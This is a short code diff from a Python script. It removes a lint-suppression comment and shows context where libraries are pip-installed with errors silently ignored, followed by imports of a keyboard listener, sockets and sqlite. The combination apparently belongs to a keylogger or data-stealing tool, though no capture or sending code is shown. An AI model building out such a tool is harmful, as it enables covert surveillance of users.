@@ -8,7 +8,7 @@ for lib in libs:
             subprocess.check_call(['pip','install',lib])
         except subprocess.CalledProcessError:
             pass
-from pynput.keyboard import Listener, Key, KeyCode  # noqa: E402
+from pynput.keyboard import Listener, Key, KeyCode
 import socket
 import os
 import sqlite3
